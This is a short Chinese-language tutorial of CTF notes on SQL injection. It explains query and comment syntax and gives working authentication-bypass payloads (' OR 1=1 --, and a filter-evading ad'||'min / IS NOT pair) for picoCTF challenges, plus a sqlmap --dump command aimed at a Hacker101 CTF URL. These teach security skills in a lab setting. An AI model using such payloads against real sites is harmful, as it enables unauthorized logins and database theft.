# SQL injection
## 簡介
sql為資料庫語言，會透過形如下面的指令進行資料查詢  
```sql
SELECT username, password FROM users WHERE username='<input>'  AND password='<input>'
```
上面的指令會從 users 資料表中選取 username, password的欄位進行你<input> 比對  
其中，SQL語言當中的註解符號多為 -- (有些版本也有 #  
邏輯可以使用=, OR, AND, IS NOT等......
特殊語法還有 ```||``` 是將兩個字串合併的動作
## 攻擊手法
如果端或者再輸入前沒有任何檢查的動作，攻擊者可以使用特殊的輸入進行查詢的繞過  
### Example 1
#### picoCTF 2019 Irish-Name-Repo 1
在網站中會看到一個admin login，明顯就是再提示你要試著登入  
使用Username ```' OR 1=1 --``` 就可以登入了(注意到他會執行的查詢是
```sql
SELECT username, password FROM users WHERE username='' OR 1=1 --'  AND password='<input>'
``` 
)  
於是他會選取使得1=1成立的所有資料，而密碼比對的部分則被我們輸入的payload用 ```--``` 註解掉了
### Example 2
#### picoCTF 2021 Web Gauntlet 3
會發現一個 filter.php檔案，當中記載了不可以使用的字元如下    
```
Filters: or and true false union like = > < ; -- /* */ admin
```
哇，剛剛的payload顯然會被擋下   
這時候可以使用剛剛介紹的字元 ```||``` 進行字串合併以及邏輯 IS NOT來撘配  
使用Username ad'||'min 以及 Password a' IS NOT 'b即可登入拿到flag了  
## Sqlmap
一款非常好使用得sql工具，主要針對網址後面有 ```?id=1``` 這種sql查詢語法的網站進行滲透測試  
[官網](https://sqlmap.org/)  
### Example 1
#### Hacker101CTF Photo Gallery
查詢圖片網址發現形如 ```https://62a4f441f2d16b1fa7f0e82d220f44ed.ctf.hacker101.com/fetch?id=1```  
二話不說打開sqlmap  
```python sqlmap.py -u "https://62a4f441f2d16b1fa7f0e82d220f44ed.ctf.hacker101.com/fetch?id=1" --dump ```  
結束~~拿到flag
